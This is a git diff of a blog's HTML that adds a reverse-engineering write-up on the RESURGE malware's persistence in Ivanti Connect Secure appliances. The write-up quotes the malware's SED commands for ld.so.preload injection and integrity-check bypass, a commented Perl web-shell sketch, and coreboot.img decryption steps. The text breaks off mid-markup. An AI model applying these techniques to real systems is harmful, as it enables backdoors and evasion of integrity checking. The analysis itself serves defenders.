@@ -4,21 +4,27 @@
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="robots" content="noodp" /><title>First_post - My New Hugo Site</title><meta name="Description" content=""><meta property="og:url" content="http://localhost:1313/post/first_post/">
-  <meta property="og:site_name" content="My New Hugo Site">
-  <meta property="og:title" content="First_post">
-  <meta property="og:description" content="First Post Amazing isnt it">
+    <meta name="robots" content="noodp" /><title>Deconstructing RESURGE: A Deep Dive into Ivanti Malware Persistence Through Boot Sequence Manipulation - Reverse Engineering Attempts</title><meta name="Description" content=""><meta property="og:url" content="http://localhost:1313/post/first_post/">
+  <meta property="og:site_name" content="Reverse Engineering Attempts">
+  <meta property="og:title" content="Deconstructing RESURGE: A Deep Dive into Ivanti Malware Persistence Through Boot Sequence Manipulation">
+  <meta property="og:description" content="A deep dive into the RESURGE malware’s persistence mechanisms targeting Ivanti Connect Secure (ICS) appliances. This article details how RESURGE hijacks the firmware upgrade process, using SED scripts to modify critical components like /etc/ld.so.preload, CGI backdoors, integrity scanners, and even the coreboot.img for extreme persistence.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="post">
-    <meta property="article:published_time" content="2025-05-15T10:41:26+08:00">
-    <meta property="article:modified_time" content="2025-05-15T10:41:26+08:00">
+    <meta property="article:published_time" content="2025-05-15T14:30:00+08:00">
+    <meta property="article:modified_time" content="2025-05-15T14:30:00+08:00">
+    <meta property="article:tag" content="RESURGE">
+    <meta property="article:tag" content="Ivanti">
+    <meta property="article:tag" content="Ivanti Connect Secure">
+    <meta property="article:tag" content="ICS">
+    <meta property="article:tag" content="Persistence">
+    <meta property="article:tag" content="Boot Sequence">
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="First_post">
-  <meta name="twitter:description" content="First Post Amazing isnt it">
-<meta name="application-name" content="My New Hugo Site">
-<meta name="apple-mobile-web-app-title" content="My New Hugo Site">
+  <meta name="twitter:title" content="Deconstructing RESURGE: A Deep Dive into Ivanti Malware Persistence Through Boot Sequence Manipulation">
+  <meta name="twitter:description" content="A deep dive into the RESURGE malware’s persistence mechanisms targeting Ivanti Connect Secure (ICS) appliances. This article details how RESURGE hijacks the firmware upgrade process, using SED scripts to modify critical components like /etc/ld.so.preload, CGI backdoors, integrity scanners, and even the coreboot.img for extreme persistence.">
+<meta name="application-name" content="Reverse Engineering Attempts">
+<meta name="apple-mobile-web-app-title" content="Reverse Engineering Attempts">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -26,13 +32,13 @@
 
 <link rel="canonical" href="http://localhost:1313/post/first_post/" />
 <link rel="stylesheet" href="/css/main.min.css"><link rel="stylesheet" href="/css/style.min.css"><script type="application/ld+json">{"@context": "https://schema.org","@type": "BlogPosting",
-        "headline": "First_post",
+        "headline": "Deconstructing RESURGE: A Deep Dive into Ivanti Malware Persistence Through Boot Sequence Manipulation",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http://localhost:1313/post/first_post/"
-        },"genre": "post","wordcount":  5 ,
-        "url": "http://localhost:1313/post/first_post/","datePublished": "2025-05-15T10:41:26+08:00","dateModified": "2025-05-15T10:41:26+08:00","publisher": {
+        },"genre": "post","keywords":["RESURGE","Ivanti","Ivanti Connect Secure","ICS","Persistence","Boot Sequence","Firmware Security","coreboot","LD_PRELOAD","CVE-2025-0282","UNC5221","Linux Security","dspkginstall","Web Shell","Integrity Check Evasion"],"wordcount":  1830 ,
+        "url": "http://localhost:1313/post/first_post/","datePublished": "2025-05-15T14:30:00+08:00","dateModified": "2025-05-15T14:30:00+08:00","publisher": {
             "@type": "Organization",
             "name": "Author"},"author": {
                 "@type": "Person",
@@ -80,13 +86,14 @@
     <div id="mask"></div><header class="desktop print:!tw-hidden" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="My New Hugo Site">My New Hugo Site</a>
+            <a href="/" title="Reverse Engineering Attempts">Reverse Engineering Attempts</a>
         </div>
         <div class="menu">
             <div class="menu-inner"><a class="menu-item"
-                    href="/posts/" > Posts </a><a class="menu-item"
+                    href="/post/" > Post </a><a class="menu-item"
                     href="/tags/" > Tags </a><a class="menu-item"
-                    href="/categories/" > Categories </a><span class="menu-item delimiter"></span><button class="menu-item theme-switch" aria-label="Switch Theme">
+                    href="/categories/" > Categories </a><a class="menu-item"
+                    href="/about/"  title="Learn more about me" > About Me </a><span class="menu-item delimiter"></span><button class="menu-item theme-switch" aria-label="Switch Theme">
                     <svg class="icon"
     xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705 0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/></svg>
                 </button></div>
@@ -96,13 +103,13 @@
     <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="My New Hugo Site">My New Hugo Site</a>
+                <a href="/" title="Reverse Engineering Attempts">Reverse Engineering Attempts</a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="" >Posts</a><a class="menu-item" href="/tags/" title="" >Tags</a><a class="menu-item" href="/categories/" title="" >Categories</a><button class="menu-item theme-switch tw-w-full" aria-label="Switch Theme">
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/post/" title="" >Post</a><a class="menu-item" href="/tags/" title="" >Tags</a><a class="menu-item" href="/categories/" title="" >Categories</a><a class="menu-item" href="/about/" title="Learn more about me" >About Me</a><button class="menu-item theme-switch tw-w-full" aria-label="Switch Theme">
                 <svg class="icon"
     xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705 0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/></svg>
             </button></div>
@@ -113,8 +120,364 @@
 </div>
 <div class="search-dropdown mobile">
     <div id="search-dropdown-mobile"></div>
-</div><main class="tw-mx-4 tw-flex-1"><div class="page single special print:!tw-w-full print:!tw-max-w-none print:!tw-m-0 print:!tw-p-0"><h1 class="single-title">First_post</h1><div class="content" id="content"><p>First Post
-Amazing isnt it</p>
+</div><main class="tw-mx-4 tw-flex-1"><div class="page single special print:!tw-w-full print:!tw-max-w-none print:!tw-m-0 print:!tw-p-0"><h1 class="single-title">Deconstructing RESURGE: A Deep Dive into Ivanti Malware Persistence Through Boot Sequence Manipulation</h1><div class="content" id="content"><p>I&rsquo;ve been closely following the extensive exploitation of Ivanti Connect Secure (ICS) appliances, detailed in reports such as the 4-part series by Google Cloud Threat Intelligence:</p>
+<ul>
+<li><a href="https://cloud.google.com/blog/topics/threat-intelligence/suspected-apt-targets-ivanti-zero-day" target="_blank" rel="noopener noreferrer">Suspected APT Targets Ivanti Zero-Day</a></li>
+<li><a href="https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-zero-day-exploitation" target="_blank" rel="noopener noreferrer">Investigating Ivanti Zero-Day Exploitation</a></li>
+<li><a href="https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-exploitation-persistence" target="_blank" rel="noopener noreferrer">Investigating Ivanti Exploitation &amp; Persistence</a></li>
+<li><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement" target="_blank" rel="noopener noreferrer">Ivanti Post-Exploitation Lateral Movement</a></li>
+</ul>
+<p>These, along with insightful analyses from CISA (<a href="https://www.cisa.gov/sites/default/files/2025-03/MAR-25993211.r1.v1.CLEAR_.pdf" target="_blank" rel="noopener noreferrer">MAR-25993211.r1.v1.CLEAR_.pdf</a>) and JPCERT/CC (<a href="https://blogs.jpcert.or.jp/en/2025/02/spawnchimera.html" target="_blank" rel="noopener noreferrer">SpawnChimera Analysis</a>), paint a picture of sustained campaigns by threat actors (like UNC5221, a suspected China-nexus group, as noted by Google/Mandiant). What particularly captured my attention amidst this landscape was the methodology of persistence employed by the RESURGE malware. This prompted a deep reverse engineering effort on my part, revealing that a thorough understanding of the Ivanti Connect Secure boot sequence is paramount to truly comprehending how RESURGE’s scripts and function hooks achieve such resilient entrenchment.</p>
+<h2 id="tldr-resurges-deep-persistence-tactics" class="headerLink">
+    <a href="#tldr-resurges-deep-persistence-tactics" class="header-mark"></a>TLDR: RESURGE&rsquo;s Deep Persistence Tactics</h2><p>This article details the persistence mechanisms of the RESURGE malware targeting Ivanti Connect Secure (ICS) appliances. RESURGE, often linked to the exploitation of vulnerabilities like CVE-2025-0282, achieves deep system persistence by hijacking the firmware upgrade process (<code>dspkginstall</code>). Using meticulously crafted SED scripts, it modifies critical system components. Key techniques include:</p>
+<ul>
+<li><strong>Root Filesystem Patching:</strong> Prepending its malicious shared object (<code>libdsupgrade.so</code>) to <code>/etc/ld.so.preload</code> (a technique also seen with other Ivanti malware like ZIPLINE), injecting a CGI backdoor into <code>compcheckresult.cgi</code> (web shells are a common theme in these attacks), and neutralizing integrity scanners (<code>scanner.py</code>, <code>check_integrity.sh</code>) by altering their scripts and re-signing the system manifest to evade the Ivanti Integrity Checker Tool (ICT) – a target for evasion by multiple actors.</li>
+<li><strong><code>coreboot.img</code> Modification:</strong> For <code>coreboot</code> upgrades, RESURGE decrypts <code>coreboot.img</code>, injects its components (including <code>libdsupgrade.so</code>), modifies the <code>init</code> script within <code>coreboot.img</code> to also preload the malicious library, and re-encrypts the image. This ensures extreme persistence.</li>
+</ul>
+<p>The outcome is an appliance where the implant loads broadly, a C2 channel is established, and a CGI backdoor allows remote command execution, aligning with the broader goals of espionage-motivated threat actors targeting edge infrastructure. My reverse engineering of RESURGE focused on its unique persistence methods within the context of the Ivanti appliance&rsquo;s architecture.</p>
+<h2 id="ivanti-connect-secure-boot--upgrade-context" class="headerLink">
+    <a href="#ivanti-connect-secure-boot--upgrade-context" class="header-mark"></a>Ivanti Connect Secure: Boot &amp; Upgrade Context</h2><p>To understand RESURGE&rsquo;s persistence, we first need a basic understanding of a typical Linux-based appliance boot process and how Ivanti handles upgrades.</p>
+<p>A typical Linux boot process involves several stages:</p>
+<ol>
+<li><strong>Power-On &amp; Firmware (BIOS/UEFI):</strong> Initializes hardware.</li>
+<li><strong>Bootloader (e.g., GRUB):</strong> Loaded by the firmware. Its job is to load the operating system kernel and an initial RAM disk (like <code>initramfs</code> or, in Ivanti&rsquo;s case, components related to <code>coreboot.img</code>).</li>
+<li><strong>Kernel &amp; Initial RAM Disk (<code>coreboot.img</code> contextually for Ivanti):</strong> The kernel starts and uses the initial RAM disk to load necessary drivers and prepare the environment. <code>coreboot.img</code> can be thought of as providing an early filesystem and often runs a lightweight <code>init</code> process.</li>
+<li><strong>Main <code>init</code> Process:</strong> The kernel mounts the main root filesystem and executes the main <code>init</code> program (e.g., <code>/sbin/init</code>, often managed by <code>/etc/inittab</code> or systemd). This process is responsible for starting system daemons and services.</li>
+<li><strong>Services Online:</strong> Critical services, including the Ivanti Connect Secure application suite, web server, and SSH, are launched.</li>
+</ol>
+<p>RESURGE cleverly exploits the <strong>firmware upgrade process</strong>, specifically the <code>dspkginstall</code> utility, as its primary infection and persistence vector. When an administrator applies a firmware package, RESURGE&rsquo;s already-implanted code (or code run as part of the exploit chain) intercepts and modifies this update process.</p>
+<h2 id="resurges-firmware-infection-mechanism" class="headerLink">
+    <a href="#resurges-firmware-infection-mechanism" class="header-mark"></a>RESURGE&rsquo;s Firmware Infection Mechanism</h2><p>RESURGE inspects the type of upgrade package being installed to deploy specific logic branches for its modifications. It heavily relies on the <strong>SED (Stream EDitor)</strong> utility to perform in-place modifications to scripts and configuration files during the upgrade. This tactic of tampering with files during the update process has been noted by Mandiant/Google, where tools like THINSPOOL were observed re-adding web shells after system updates.</p>
+<p>RESURGE employs two primary scripts for its modifications:</p>
+<h3 id="branch-1-root-filesystem-compromise-script-1" class="headerLink">
+    <a href="#branch-1-root-filesystem-compromise-script-1" class="header-mark"></a>Branch 1: Root Filesystem Compromise (Script #1)</h3><p>This script is applied to most upgrade packages (excluding <code>coreboot</code>-specific ones initially, though <code>coreboot</code> upgrades will also include these actions later). It targets the <code>./do-install</code> script within the upgrade package.</p>
+<p>Key actions performed by SED commands injected by RESURGE:</p>
+<ol>
+<li>
+<p><strong>Implant Staging (Lines 0-2 of RESURGE&rsquo;s script):</strong></p>
+<ul>
+<li>Before a legitimate status message (e.g., <code>echo_console &quot;Saving package&quot;</code>), RESURGE inserts commands using SED&rsquo;s <code>i\</code> (insert before) functionality.</li>
+<li><code>cp /lib/libdsupgrade.so /tmp/data/root/lib/libdsupgrade.so</code>: The primary malicious shared object (<code>libdsupgrade.so</code>) is copied into the staging area of the new root filesystem.</li>
+<li><code>cp /home/venv3/.../scanner-0.1-py3.6.egg ...</code>: A helper Python egg (likely for manipulating Python-based tools) is also staged.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>LD_PRELOAD</code> Persistence (Lines 3-7):</strong></p>
+<ul>
+<li>
+<p><strong>Line 4:</strong> <code>sed -i '1i/lib/libdsupgrade.so' /tmp/data/root/etc/ld.so.preload</code></p>
+<ul>
+<li>This command prepends the path <code>/lib/libdsupgrade.so</code> to the <code>/etc/ld.so.preload</code> file within the staged root filesystem. This ensures the malicious library is loaded before any other library for most dynamically linked executables. This technique is a well-known method for achieving broad user-space hooking and was also observed in other Ivanti-targeting malware like ZIPLINE, which utilized it when <code>dspkginstall</code> was the executing process name.</li>
+</ul>
+</li>
+<li>
+<p><strong>Lines 6-7:</strong> The Perl module <code>/tmp/data/root/home/perl/DSUpgrade.pm</code> is modified using SED.</p>
+<ul>
+<li>It sets the environment variable <code>$ENV{&quot;LD_PRELOAD&quot;} = &quot;libdsupgrade.so&quot;;</code> specifically during the upgrade process (likely when <code>popen</code> is used within <code>DSUpgrade.pm</code>).</li>
+<li>The variable is then cleared post-<code>popen</code> call for evasion, making the <code>LD_PRELOAD</code> trickery during the upgrade itself less obvious if <code>DSUpgrade.pm</code> were inspected live.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>CGI Backdoor Injection (Lines 9-10):</strong></p>
+<ul>
+<li>
+<p><strong>Line 9:</strong> An 8-line Perl snippet is injected via SED into <code>/usr/local/ive/ responsabile/compcheckresult.cgi</code> (targeting <code>tmp/data/root/usr/local/ive/ responsabile/compcheckresult.cgi</code> during the upgrade). This snippet creates a web shell, allowing remote command execution via a GET request parameter named <code>vXm8DtMJG</code>. Web shells are a common payload in Ivanti exploitations, as seen with LIGHTWIRE (delivered via THINSPOOL) and various Perl-based shells detailed by JPCERT.</p>
+<div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
+  <div class="
+    
+    tw-flex 
+    tw-flex-row
+    tw-flex-1 
+    tw-justify-between 
+    tw-w-full tw-bg-bgColor-secondary
+    ">      
+    <button 
+      class="
+        code-block-button
+        tw-mx-2 
+        tw-flex
+        tw-flex-row
+        tw-flex-1"
+      aria-hidden="true">
+          <div class="group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></div>
+          <p class="tw-select-none !tw-my-1">perl</p>
+      </button>
+
+   <div class="tw-flex">
+      <button 
+        class="
+          line-number-button
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.show-line-numbers]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle line numbers"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
+
+      <button 
+        class="
+          wrap-code-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.is-wrap]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle code wrap"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
+      
+      <button 
+        class="
+          copy-code-button
+          tw-select-none
+          tw-mx-2 
+          tw-hidden
+          group-[.is-open]:tw-block
+          hover:tw-text-fgColor-link 
+          print:!tw-hidden"
+        title="Copy code">
+          <span class="copy-icon tw-block"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M433.941 65.941l-51.882-51.882A48 48 0 0 0 348.118 0H176c-26.51 0-48 21.49-48 48v48H48c-26.51 0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51 0 48-21.49 48-48v-48h80c26.51 0 48-21.49 48-48V99.882a48 48 0 0 0-14.059-33.941zM266 464H54a6 6 0 0 1-6-6V150a6 6 0 0 1 6-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 0 1-6 6zm128-96H182a6 6 0 0 1-6-6V54a6 6 0 0 1 6-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 0 1-6 6zm6-256h-64V48h9.632c1.591 0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 0 1 1.757 4.243V112z"/></svg></span>
+          <span class="check-icon tw-hidden"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
+      </button>
+        
+      <button 
+        class="
+          tw-select-none 
+          tw-mx-2 
+          tw-block 
+          group-[.is-open]:tw-hidden 
+          print:!tw-hidden" 
+        disabled
+        aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button>
+    </div>
+  </div>
+  <pre style="counter-reset: codeblock;" class="tw-block tw-m-0 tw-p-0"><code 
+    id="codeblock-id-1" 
+    class="
+      chroma 
+      !tw-block 
+      tw-p-0
+      tw-m-0
+      tw-transition-[max-height] 
+      tw-duration-500 
+      tw-ease-in-out 
+      group-[.is-closed]:!tw-max-h-0 
+      group-[.is-wrap]:tw-text-wrap
+      tw-overflow-y-hidden
+      tw-overflow-x-auto
+      tw-scrollbar-thin
+      "><span class="line"><span class="cl"><span class="c1"># Example structure of the injected Perl code (conceptual)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># if ($ENV{&#39;QUERY_STRING&#39;} =~ /vXm8DtMJG=([^&amp;]+)/) {</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     my $cmd = $1;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     # Decode/Sanitize $cmd (or not, if poorly written)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     my $output = `$cmd`;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     print &#34;Content-type: text/plain\n\n&#34;;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     print $output;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     exit 0;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># }</span></span></span></code></pre>
+</div>
+</li>
+<li>
+<p><strong>Line 10:</strong> The manifest hash for the now-modified <code>compcheckresult.cgi</code> file is updated within the system manifest file. This is an attempt to make the modification appear legitimate to basic integrity checks that rely on this manifest.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Integrity Check Evasion (Lines 8, 11-17):</strong></p>
+<ul>
+<li><strong>Line 11:</strong> <code>sed -i 's/exit 1/exit 0/g' /tmp/data/root/home/bin/check_integrity.sh</code>
+<ul>
+<li>The system&rsquo;s integrity checking script, <code>check_integrity.sh</code>, is modified to always <code>exit 0</code> (success), regardless of whether it finds discrepancies. Evading Ivanti&rsquo;s Integrity Checker Tool (ICT) is a crucial objective for attackers. Malware like ZIPLINE attempted this by trying to add its components to an exclusion list for the ICT.</li>
+</ul>
+</li>
+<li><strong>Lines 13-17:</strong> RESURGE takes further steps to defeat the ICT:
+<ul>
+<li>A new RSA key pair is generated.</li>
+<li>The system manifest (which now includes the hash of the backdoored CGI and potentially other RESURGE files) is re-signed using the newly generated private key.</li>
+<li>The new public key and the new signature are then used to replace Ivanti&rsquo;s original public key and signature files. This effectively makes the tampered system state appear valid to the ICT, as it would be verifying against attacker-controlled keys.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="branch-2-corebootimg-tampering-for-deeper-persistence-script-2" class="headerLink">
+    <a href="#branch-2-corebootimg-tampering-for-deeper-persistence-script-2" class="header-mark"></a>Branch 2: <code>coreboot.img</code> Tampering for Deeper Persistence (Script #2)</h3><p>This script is specifically for <code>coreboot</code> package upgrades. It includes all the actions from Script #1 (ensuring the root filesystem is also compromised) and adds direct manipulation of the <code>coreboot.img</code> itself. This image is critical as it&rsquo;s involved in the early stages of the boot process.</p>
+<p>The modifications are applied to the <code>/tmp/installer/do-install-coreboot</code> script:</p>
+<ol>
+<li>
+<p><strong><code>coreboot.img</code> Decryption (Lines 18-25 of RESURGE&rsquo;s script):</strong></p>
+<ul>
+<li>
+<p><strong>Line 18:</strong> SED is used to hook the routine where <code>coreboot.img</code> is copied, allowing RESURGE to operate on it.</p>
+</li>
+<li>
+<p><strong>Lines 19-24:</strong> A series of commands are orchestrated to extract the AES encryption key for <code>coreboot.img</code>:</p>
+<ul>
+<li><code>dsmain -g</code> is used (potentially to enable gzip/gunzip functionality within <code>dsmain</code> or related tools).</li>
+<li><code>extract_vmlinux.sh</code> (a standard Ivanti script) is called to extract the <code>vmlinux</code> (kernel image) from the <code>coreboot</code> package.</li>
+<li><code>strings</code> and <code>xxd</code> are used on the extracted <code>vmlinux</code> to search for and dump a 16-byte AES-CTR key. This implies the key is stored, perhaps obfuscated, within the kernel image itself.</li>
+</ul>
+</li>
+<li>
+<p><strong>Line 25:</strong> <code>dsmain -d coreboot.img /tmp/new_img/coreboot.img.1.gz $key</code></p>
+<ul>
+<li>The <code>dsmain</code> utility (an Ivanti binary) is used with the <code>-d</code> (decrypt) option, the extracted <code>$key</code>, and the input <code>coreboot.img</code> to produce a decrypted (and gzipped) version at <code>/tmp/new_img/coreboot.img.1.gz</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Injecting into <code>coreboot.img</code> Filesystem (Lines 26-33):</strong></p>
+<ul>
+<li><strong>Lines 26-27:</strong> The decrypted image is uncompressed (<code>gunzip</code>) and its contents (a CPIO archive) are extracted into a temporary filesystem directory, <code>/tmp/coreboot_fs</code>.
+<div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
+  <div class="
+    
+    tw-flex 
+    tw-flex-row
+    tw-flex-1 
+    tw-justify-between 
+    tw-w-full tw-bg-bgColor-secondary
+    ">      
+    <button 
+      class="
+        code-block-button
+        tw-mx-2 
+        tw-flex
+        tw-flex-row
+        tw-flex-1"
+      aria-hidden="true">
+          <div class="group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></div>
+          <p class="tw-select-none !tw-my-1">bash</p>
+      </button>
+
+   <div class="tw-flex">
+      <button 
+        class="
+          line-number-button
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.show-line-numbers]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle line numbers"><svg class="icon"
